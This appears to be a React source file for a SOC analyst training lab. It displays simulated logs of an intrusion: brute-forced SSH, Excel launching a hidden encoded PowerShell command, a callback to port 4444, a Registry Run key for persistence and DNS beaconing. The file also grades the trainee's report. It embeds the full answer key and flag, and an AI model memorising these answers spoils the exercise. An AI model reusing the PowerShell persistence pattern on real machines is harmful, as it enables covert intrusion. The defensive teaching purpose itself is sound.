"use client";

import { useState } from "react";

const LOGS = {
  "auth.log": `2026-05-09 13:58:01 UTC  sshd: Failed password for invalid user admin from 192.168.1.45 port 51201
2026-05-09 13:59:14 UTC  sshd: Accepted password for webserver from 10.0.0.15 port 43201
2026-05-09 14:00:01 UTC  sshd: Failed password for finance.user from 198.51.100.42 port 51422
2026-05-09 14:00:03 UTC  sshd: Failed password for finance.user from 198.51.100.42 port 51423
2026-05-09 14:00:05 UTC  sshd: Failed password for finance.user from 198.51.100.42 port 51424
2026-05-09 14:00:09 UTC  sshd: Failed password for finance.user from 198.51.100.42 port 51425
2026-05-09 14:00:18 UTC  sshd: Accepted password for finance.user from 198.51.100.42 port 51428
2026-05-09 14:00:21 UTC  sudo: finance.user ran: sudo -l (exit 0)`,

  "sysmon": `2026-05-09 14:00:19 UTC  EventID 1  ProcessCreate: EXCEL.EXE (PID 4821) — finance.user
2026-05-09 14:03:02 UTC  EventID 1  ProcessCreate: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...
                                    (PID 5102, parent: EXCEL.EXE PID 4821)
2026-05-09 14:03:04 UTC  EventID 3  NetworkConnect: powershell.exe PID 5102 → 198.51.100.42:4444
2026-05-09 14:03:07 UTC  EventID 13 RegistryValueSet:
                                    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
                                    = powershell.exe -nop -w hidden -enc <base64>
2026-05-09 14:04:01 UTC  EventID 1  ProcessCreate: cmd.exe (PID 5201, parent: powershell.exe 5102)
2026-05-09 14:04:03 UTC  EventID 1  ProcessCreate: whoami.exe (PID 5202, parent: cmd.exe 5201)
2026-05-09 14:04:08 UTC  EventID 1  ProcessCreate: net.exe user /domain (PID 5203, parent: cmd.exe 5201)`,

  "dns": `2026-05-09 13:57:44 UTC  finance-ws01  A?    update.windows-telemetry[.]com → NXDOMAIN
2026-05-09 14:00:01 UTC  finance-ws01  A?    mail.company.internal → 10.0.0.25
2026-05-09 14:03:03 UTC  finance-ws01  A?    cdn.ms-update[.]net → 198.51.100.42
2026-05-09 14:03:05 UTC  finance-ws01  A?    api.ms-update[.]net → 198.51.100.42
2026-05-09 14:10:17 UTC  finance-ws01  TXT?  finance-ws01.ms-update[.]net → (beaconing)
2026-05-09 14:15:17 UTC  finance-ws01  TXT?  finance-ws01.ms-update[.]net → (beaconing)
2026-05-09 14:20:17 UTC  finance-ws01  TXT?  finance-ws01.ms-update[.]net → (beaconing)`,
} as const;

type LogTab = keyof typeof LOGS;

type ExistingResponse = { stage: string; response: string; id: string };
type EvalResult = {
  accuracyScore: number;
  clarityScore: number;
  completenessScore: number;
  recommendation: string;
  feedback: string;
};

const ACCESS_OPTIONS = [
  { value: "email_attachment", label: "Malicious email attachment (Excel file)" },
  { value: "web_exploit", label: "Web application exploit" },
  { value: "brute_force_only", label: "Brute-force with no payload" },
  { value: "insider", label: "Insider threat" },
];

const PERSISTENCE_OPTIONS = [
  { value: "registry_run", label: "Registry Run key (HKCU\\...\\Run\\Updater)" },
  { value: "scheduled_task", label: "Scheduled task" },
  { value: "service", label: "Windows service creation" },
  { value: "startup_folder", label: "Startup folder" },
];

function highlight(line: string): string {
  if (line.includes("198.51.100.42")) return "text-red-400";
  if (line.includes("Failed password")) return "text-amber-400";
  if (line.includes("Accepted password") || line.includes("beaconing")) return "text-orange-400";
  if (line.includes("powershell") || line.includes("cmd.exe") || line.includes("whoami")) return "text-red-300";
  if (line.includes("RegistryValueSet") || line.includes("Run\\Updater")) return "text-red-400";
  return "text-zinc-300";
}

export function SocInvestigationForm({
  labId,
  existing,
}: {
  labId: string;
  existing: ExistingResponse[];
}) {
  const prev = existing.find((r) => r.stage === "investigation");
  const prevEval = existing.find((r) => r.stage === "ai_evaluation");

  const [tab, setTab] = useState<LogTab>("auth.log");
  const [ip, setIp] = useState("");
  const [accessVector, setAccessVector] = useState("");
  const [persistence, setPersistence] = useState("");
  const [patientZero, setPatientZero] = useState("");
  const [summary, setSummary] = useState("");
  const [submitted, setSubmitted] = useState(!!prev);
  const [responseId, setResponseId] = useState(prev?.id ?? "");
  const [isPending, setIsPending] = useState(false);
  const [evalResult, setEvalResult] = useState<EvalResult | null>(
    prevEval ? (JSON.parse(prevEval.response) as EvalResult) : null
  );
  const [evalPending, setEvalPending] = useState(false);
  const [ipResult, setIpResult] = useState<"correct" | "wrong" | null>(null);

  async function submitInvestigation(e: React.FormEvent) {
    e.preventDefault();
    if (!summary.trim() || summary.trim().length < 50) return;

    setIsPending(true);
    try {
      const res = await fetch("/api/labs/response", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          labId,
          stage: "investigation",
          response: JSON.stringify({ ip, accessVector, persistence, patientZero, summary }),
        }),
      });
      if (res.ok) {
        const data = (await res.json()) as { id: string };
        setResponseId(data.id);
        setSubmitted(true);
        setIpResult(ip.trim().replace(/^sage\{|\}$/gi, "") === "198.51.100.42" ? "correct" : "wrong");
      }
    } finally {
      setIsPending(false);
    }
  }

  async function requestAiEval() {
    if (!responseId) return;
    setEvalPending(true);
    try {
      const res = await fetch("/api/ai/evaluate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ labResponseId: responseId }),
      });
      if (res.ok) {
        const data = (await res.json()) as { evaluation?: EvalResult };
        if (data.evaluation) setEvalResult(data.evaluation);
      }
    } finally {
      setEvalPending(false);
    }
  }

  return (
    <div className="space-y-8">
      {/* Scenario */}
      <div className="rounded-lg border border-amber-500/30 bg-amber-500/5 p-4 text-sm space-y-1">
        <p className="text-amber-400 font-medium">Active incident — SOC-2026-0509</p>
        <p className="text-zinc-300">
          A finance employee opened an Excel attachment from an unsolicited email. Unusual outbound
          connections and privilege-escalation commands were observed shortly after. Investigate the
          logs below and complete the analyst report.
        </p>
      </div>

      {/* Log viewer */}
      <div>
        <div className="flex gap-1 mb-0">
          {(Object.keys(LOGS) as LogTab[]).map((t) => (
            <button
              key={t}
              onClick={() => setTab(t)}
              className={
                "px-3 py-1.5 text-xs font-mono rounded-t border-t border-x " +
                (tab === t
                  ? "bg-zinc-900 border-white/10 text-sage-500"
                  : "bg-black/20 border-white/5 text-zinc-500 hover:text-zinc-300")
              }
            >
              {t}
            </button>
          ))}
        </div>
        <div className="rounded-b rounded-tr border border-white/10 bg-zinc-950 p-4 overflow-x-auto max-h-60 overflow-y-auto">
          {LOGS[tab].split("\n").map((line, i) => (
            <p key={i} className={`text-xs font-mono leading-5 whitespace-pre ${highlight(line)}`}>
              {line}
            </p>
          ))}
        </div>
      </div>

      {/* Investigation form */}
      {!submitted ? (
        <form onSubmit={submitInvestigation} className="space-y-5">
          <h3 className="font-semibold text-lg">Analyst report</h3>

          <Field label="Malicious source IP">
            <input
              value={ip}
              onChange={(e) => setIp(e.target.value)}
              placeholder="x.x.x.x  or  SAGE{x.x.x.x}"
              className="input-field"
            />
          </Field>

          <Field label="Initial access vector">
            <Select value={accessVector} onChange={setAccessVector} options={ACCESS_OPTIONS} />
          </Field>

          <Field label="Persistence mechanism">
            <Select value={persistence} onChange={setPersistence} options={PERSISTENCE_OPTIONS} />
          </Field>

          <Field label="Patient zero (compromised account)">
            <input
              value={patientZero}
              onChange={(e) => setPatientZero(e.target.value)}
              placeholder="username"
              className="input-field"
            />
          </Field>

          <Field label={`Incident summary (min 50 chars — ${summary.length} typed)`}>
            <textarea
              value={summary}
              onChange={(e) => setSummary(e.target.value)}
              rows={6}
              placeholder="Describe what happened, how the attacker got in, what they did, and how they maintained access…"
              className="input-field resize-y"
            />
          </Field>

          <button
            type="submit"
            disabled={isPending || summary.trim().length < 50}
            className="rounded bg-sage-500 px-5 py-2.5 text-sm font-medium text-black hover:bg-sage-700 hover:text-white disabled:opacity-50"
          >
            {isPending ? "Submitting…" : "Submit report"}
          </button>
        </form>
      ) : (
        <div className="space-y-5">
          <h3 className="font-semibold text-lg">Report submitted</h3>

          <div className="rounded-lg border border-white/10 divide-y divide-white/10 text-sm">
            <Result
              label="Malicious IP"
              value={ipResult === "correct" ? "198.51.100.42 ✓" : "Incorrect — check auth.log for repeated failures"}
              correct={ipResult === "correct"}
            />
            <Result
              label="Access vector"
              value="Malicious email attachment (Excel file) ✓"
              correct={accessVector === "email_attachment"}
              hint={accessVector !== "email_attachment" ? "See sysmon: EXCEL.EXE spawned PowerShell" : undefined}
            />
            <Result
              label="Persistence"
              value="Registry Run key (HKCU\\...\\Run\\Updater) ✓"
              correct={persistence === "registry_run"}
              hint={persistence !== "registry_run" ? "See sysmon EventID 13: RegistryValueSet" : undefined}
            />
            <Result
              label="Patient zero"
              value="finance.user ✓"
              correct={patientZero.toLowerCase().includes("finance.user")}
              hint={!patientZero.toLowerCase().includes("finance.user") ? "See auth.log: Accepted password for finance.user" : undefined}
            />
          </div>

          {ipResult === "correct" && (
            <div className="rounded-lg border border-sage-500/30 bg-sage-500/5 p-4 text-sm">
              <p className="text-sage-500 font-medium">Flag revealed</p>
              <p className="text-zinc-300 mt-1 font-mono">SAGE{"{198.51.100.42}"}</p>
              <p className="text-zinc-500 mt-1">Submit this in the flag form below to record your solve.</p>
            </div>
          )}

          {!evalResult ? (
            <button
              onClick={requestAiEval}
              disabled={evalPending}
              className="rounded border border-sage-500/40 px-4 py-2 text-sm text-sage-500 hover:bg-sage-500/10 disabled:opacity-50"
            >
              {evalPending ? "Analysing with AI…" : "Get AI feedback on your summary →"}
            </button>
          ) : (
            <AiEvalDisplay result={evalResult} />
          )}
        </div>
      )}
    </div>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="space-y-1.5">
      <label className="block text-sm font-medium text-zinc-300">{label}</label>
      {children}
    </div>
  );
}

function Select({
  value,
  onChange,
  options,
}: {
  value: string;
  onChange: (v: string) => void;
  options: { value: string; label: string }[];
}) {
  return (
    <select
      value={value}
      onChange={(e) => onChange(e.target.value)}
      className="input-field"
    >
      <option value="">Select…</option>
      {options.map((o) => (
        <option key={o.value} value={o.value}>{o.label}</option>
      ))}
    </select>
  );
}

function Result({
  label,
  value,
  correct,
  hint,
}: {
  label: string;
  value: string;
  correct: boolean;
  hint?: string;
}) {
  return (
    <div className="flex items-start justify-between p-3 gap-4">
      <div>
        <p className="text-zinc-400 text-xs">{label}</p>
        <p className={correct ? "text-sage-500" : "text-zinc-300"}>{value}</p>
        {hint && <p className="text-xs text-zinc-500 mt-0.5">{hint}</p>}
      </div>
      <span className={correct ? "text-sage-500" : "text-red-400"}>
        {correct ? "✓" : "✗"}
      </span>
    </div>
  );
}

function AiEvalDisplay({ result }: { result: EvalResult }) {
  const avg = Math.round((result.accuracyScore + result.clarityScore + result.completenessScore) / 3);
  return (
    <div className="rounded-lg border border-white/10 p-4 space-y-4">
      <div className="flex items-center justify-between">
        <p className="font-medium">Sage Brain — AI evaluation</p>
        <span
          className={
            "text-xs px-2 py-0.5 rounded-full font-medium " +
            (result.recommendation === "Strong hire"
              ? "bg-sage-500/20 text-sage-500"
              : result.recommendation === "Potential hire"
              ? "bg-amber-500/20 text-amber-400"
              : "bg-red-500/20 text-red-400")
          }
        >
          {result.recommendation}
        </span>
      </div>

      <div className="grid grid-cols-3 gap-3">
        <Score label="Accuracy" value={result.accuracyScore} />
        <Score label="Clarity" value={result.clarityScore} />
        <Score label="Completeness" value={result.completenessScore} />
      </div>

      <div className="text-center">
        <p className="text-3xl font-bold">{avg}<span className="text-lg text-zinc-500">/10</span></p>
        <p className="text-xs text-zinc-500 mt-0.5">overall</p>
      </div>

      <p className="text-sm text-zinc-400 border-t border-white/10 pt-3">{result.feedback}</p>
    </div>
  );
}

function Score({ label, value }: { label: string; value: number }) {
  return (
    <div className="rounded border border-white/10 p-3 text-center">
      <p className="text-2xl font-bold">{value}</p>
      <p className="text-xs text-zinc-500">{label}</p>
    </div>
  );
}
